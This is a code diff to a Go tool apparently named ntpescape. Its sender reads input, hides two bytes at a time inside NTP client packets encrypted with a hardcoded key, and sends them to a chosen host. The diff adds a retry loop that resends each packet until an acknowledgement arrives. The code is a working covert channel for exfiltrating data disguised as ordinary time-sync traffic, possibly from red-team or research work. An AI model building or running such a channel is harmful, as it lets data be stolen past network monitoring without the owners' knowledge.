@@ -2,18 +2,21 @@ package send
 
 import (
 	"bufio"
+	"bytes"
 	"encoding/binary"
-	"errors"
 	"flag"
 	"fmt"
 	"io"
 	"log"
 	"net"
-	"github.com/evallen/ntpescape/common"
 	"os"
+	"time"
+
+	"github.com/evallen/ntpescape/common"
 )
 
 var key = []byte{0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa}
+const timeout = 5 * time.Second
 
 // Goal: Send an NTP packet to myself with the TX timestamp
 // looking normal, but the final two bytes being 0a 0b
@@ -39,31 +42,81 @@ func Main() {
 
 		for i := 0; i < len(inbuf); i += 2 {
 			var message uint16
-			if i == len(inbuf) - 1 {
+			if i == len(inbuf)-1 {
 				message = uint16(inbuf[i]) << 8
 			} else {
-				message = uint16(inbuf[i]) << 8 | uint16(inbuf[i+1])
+				message = uint16(inbuf[i])<<8 | uint16(inbuf[i+1])
 			}
-			sendMessage(message, host)
+
+			keepTryingMessage(message, host)
 		}
 
 		inbuf = inbuf[:cap(inbuf)]
 	}
 }
 
-func sendMessage(message uint16, host *string) error {
-	conn, err := net.Dial("udp", *host)
+func keepTryingMessage(message uint16, host *string) error {
+	raddr, err := net.ResolveUDPAddr("udp", *host)
+	if err != nil {
+		return fmt.Errorf("failed resolving host %v: ", err)
+	}
+
+	conn, err := net.DialUDP("udp", nil, raddr)
 	if err != nil {
 		return fmt.Errorf("failed to connect to %v: %v", *host, err)
 	}
 	defer conn.Close()
 
+	result := false
+
+	for !result {
+		log.Printf("Sending packet\n")
+		sentPacket, err := sendMessage(message, conn)
+		if err != nil {
+			log.Printf("error sending message: %v\n", err)
+		}
+
+		log.Printf("Waiting for ack\n")
+		result, err = waitForAck(sentPacket, conn)
+		log.Printf("Finished waiting for ack: %v, %v\n", result, err)
+		if err != nil {
+			log.Printf("error waiting for ACK: %v", err)
+		}
+	}
+
+	return nil
+}
+
+func sendMessage(message uint16, conn *net.UDPConn) (*common.NTPPacket, error) {
 	packet := common.GenerateClientPkt()
 	packet.PatchPacketEncrypted(message, key)
 
 	if err := binary.Write(conn, binary.BigEndian, packet); err != nil {
-		return fmt.Errorf("failed sending packet %v to %v: %v", packet, *host, err)
+		return &common.NTPPacket{},
+			fmt.Errorf("failed sending packet %v to %v: %v", packet, conn.RemoteAddr(), err)
 	}
 
-	return nil
+	return packet, nil
+}
+
+func waitForAck(packet *common.NTPPacket, conn *net.UDPConn) (result bool, err error) {
+	b := make([]byte, 512)
+	conn.SetReadDeadline(time.Now().Add(timeout))
+	_, _, err = conn.ReadFromUDP(b)
+	if err != nil {
+		return false, fmt.Errorf("failed reading ACK from UDP: %v", err)
+	}
+
+	var response common.NTPPacket
+	err = binary.Read(bytes.NewBuffer(b), binary.BigEndian, &response)
+	if err != nil {
+		return false, fmt.Errorf("failed reading ACK packet: %v", err)
+	}
+
+	if response.OrigTimeSec == packet.TxTimeSec && 
+	   response.OrigTimeFrac == packet.TxTimeFrac {
+		return true, nil
+	}
+
+	return false, nil
 }
